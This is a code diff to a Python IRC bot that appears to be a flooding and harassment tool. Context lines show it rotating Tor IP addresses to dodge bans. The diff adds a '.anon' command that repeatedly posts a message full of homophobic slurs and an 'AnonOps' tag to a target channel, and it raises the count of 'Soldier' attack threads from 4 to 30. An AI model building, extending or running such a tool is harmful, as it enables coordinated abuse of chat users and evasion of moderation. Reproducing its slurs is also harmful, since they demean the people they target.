@@ -39,6 +39,13 @@ def receive(s,channel):
 				s.send("QUIT oops\r\n")       
 				s.close()
 				os._exit()
+			if sData.startswith(".anon "):
+				i= 0
+				while i < 3:
+					p = sData.split(" ")
+					channel = p[1]
+					s.send("PRIVMSG " + channel + " :FUCK YOU FAGGOT BITCHES #ANONOPS WAS HERE\r\n")
+					i+=1   
 			if sData.startswith(".penis"):
 				s.send('PRIVMSG ' + channel + ' :IM GAY :^)\r\n')   
 			if sData.startswith(".say "):
@@ -76,7 +83,7 @@ def NewTorIP():
 		controller.signal(Signal.NEWNYM)
 oldIP = "0.0.0.0"
 newIP = "0.0.0.0"
-for n in range(4):
+for n in range(30):
 	thread = threading.Thread(target=Soldier)
 	thread.start()
 	threads.append(thread)
